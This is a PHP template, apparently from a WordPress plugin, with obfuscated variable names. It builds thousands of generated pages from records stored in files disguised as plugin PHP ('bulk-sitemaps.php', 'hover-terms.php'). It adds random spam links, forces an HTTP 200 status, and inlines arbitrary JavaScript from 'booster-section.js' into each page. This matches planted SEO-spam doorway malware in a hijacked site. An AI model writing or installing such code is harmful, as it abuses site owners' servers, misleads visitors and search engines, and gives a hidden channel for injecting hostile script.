<?php
$z9dINM7 = intval(get_query_var('kqeiefq'));

if ($z9dINM7 < 1 || $z9dINM7 > 4088) return;
$ilesrHG = file(plugin_dir_path(__FILE__).'bulk-sitemaps.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$lFHlhJS = explode(';', $ilesrHG[$z9dINM7]);
if (count($lFHlhJS) < 2) return;
$kBlMv6 = $lFHlhJS[0];
$pReATYGRs  = $lFHlhJS[1];
$iIW6B = $lFHlhJS[2];
$j2pQc2nf  = $lFHlhJS[3];
$luKvJG = $lFHlhJS[4];
set_query_var('lbydckdvhv', $kBlMv6);

$xRWUw3n = '';
$jwjr2q = plugin_dir_path(__FILE__).'hover-terms.php';
if (is_file($jwjr2q)) {
	$jgQOB = file($jwjr2q, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($jgQOB);
	shuffle($jgQOB);
	$bkC8j9 = mt_rand(2, 5);
	if (count($jgQOB) > $bkC8j9) {
		for ($hUUOgLj7 = 0; $hUUOgLj7 < $bkC8j9; $hUUOgLj7++) {
			$lsQp6ii4 = array_shift($jgQOB);
			$xRWUw3n .= '<p><a href="'.$lsQp6ii4.'">'.$lsQp6ii4.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $kBlMv6; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $pReATYGRs . "</p>\n";
				if (strlen($j2pQc2nf) > 0) echo "<p>" . $j2pQc2nf . "</p>\n";
				if (strlen($iIW6B) > 0) echo "<p>" . $iIW6B . "</p>\n";
				if (strlen($luKvJG) > 0) echo '<p><a href="#"><img src="'.$luKvJG.'"></a>' . "</p>\n";
				echo $xRWUw3n;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$nuewbV6VO = plugin_dir_path(__FILE__) . 'booster-section.js';
if (is_file($nuewbV6VO)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($nuewbV6VO);
	echo '</script>';
}
get_footer();
?>
